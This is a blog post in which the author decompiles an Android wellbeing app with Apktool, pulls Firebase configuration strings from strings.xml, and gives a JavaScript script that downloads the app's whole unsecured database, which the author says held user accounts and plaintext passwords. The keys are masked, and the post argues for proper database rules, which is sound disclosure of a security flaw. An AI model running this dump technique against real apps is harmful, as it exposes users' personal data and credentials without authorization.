[](ujjujjuj)
[](https://ujwl.in)
[](2023-02-04)

# Hacking AICTE's "Happiness App"

A few months back, my college sent every student an email asking us to download an app called _YOL - YourOneLife_ which claims to be approved by AICTE. For those of you who don't know, AICTE stands for the All India Council for Technical Education. I don't exactly know what this council does but it comes under the Indian ministry of education so it must be something serious.
<br />
<br />
This app claims to have an _inbuilt AI_ that will assess each institute's happiness index. 😱

> Students will have an opportunity to earn NFTs on the app. Students can redeem these NFTs after 6 months for various goodies and vouchers and even trade them for value.

All of this looks pretty shady. They're every buzzword that exists to market your app. This motivated me to dig deep into what this application actually does, so I decided to download and check it out myself.

## First Look

As it turns out, the app is garbage. The text isn't even visible because its color is the same as the background color. I can't even figure out what to do to log in. Other people were also facing the same issue as evident from the Play Store reviews of this app.

I don't think I'll be able to check out this app in the _conventional_ way, so I decided to reverse-engineer it.

## Reverse Engineering the App

I decided to use [Apktool](https://ibotpeaches.github.io/Apktool/) to decompile the app. Apktool is a tool to reverse engineer 3rd party closed-source android apps. To be clear, it is not illegal to decompile an application. After downloading the APK file of the app, decompiling it was very easy

```plaintext
$ apktool d com.yol.apk

I: Using Apktool 2.6.1 on com.yol.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/ujjujjuj/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Baksmaling classes2.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

The first file I went looking for is called _strings.xml_. It is where the app developer stores hardcoded strings - including database URLs, API keys, and other interesting stuff. This file had a database URL and Google API keys inside it.

```xml
<string name="firebase_database_url">https://XXXXX.firebaseio.com</string>
<string name="google_api_key">XXXXX</string>
<string name="google_app_id">XXXXX</string>
<string name="project_id">XXXXX</string>
<string name="google_storage_bucket">XXXXX.appspot.com</string>
```

It is common for apps that use Firebase to store their keys in here. Some inexperienced developers forget to secure their firebase database by not setting up proper access permissions which could very well be the case here, so I decided to access Firebase using these keys.
<br />
<br />
I wrote a script in JS to do just that

```js
import { initializeApp } from "firebase/app";
import { getDatabase, ref, onValue } from "firebase/database";
import fs from "fs";

const firebaseConfig = {
  apiKey: "XXXXX",
  authDomain: "XXXXX.firebaseapp.com",
  databaseURL: "https://XXXXX.firebaseio.com",
  projectId: "XXXXX",
  storageBucket: "XXXXX.appspot.com",
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);
const dbRef = ref(database);
onValue(dbRef, (ss) => {
  console.log("downloaded snapshot");
  fs.writeFile("data.json", JSON.stringify(ss.val(), null, 4), "utf8", () => {
    console.log("saved");
    process.exit();
  });
});
```

And guess what, my suspicion was correct. The database was not configured properly and I was able to download all the data. I was able to download about 38MB of JSON data which contained user account data and posts. To my surprise, the user passwords were in **plaintext** and not hashed. This clearly showed that the application developer had no idea about security, or just had no regard for the safety of the users. 

## Conclusion

This is an easily preventable vulnerability. All you have to do is read the [firebase docs](https://firebase.google.com/docs/firestore/solutions/role-based-access) about database rules. AICTE should re-evaluate its approval procedure to not allow such low-quality apps to pass.
